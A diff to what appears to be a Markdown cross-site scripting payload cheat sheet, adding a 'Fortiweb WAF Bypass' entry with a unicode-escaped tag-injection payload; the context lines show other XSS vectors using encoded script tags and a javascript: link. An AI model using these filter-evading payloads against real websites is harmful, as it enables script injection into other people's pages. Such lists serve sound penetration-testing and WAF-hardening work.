@@ -1062,6 +1062,11 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 <a href=javas&#99;ript:alert(1)>
 ```
 
+### Fortiweb WAF Bypass by [@rezaduty](https://twitter.com/rezaduty) - 9th July 2019
+
+```javascript
+\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
+```
 
 ## References
 
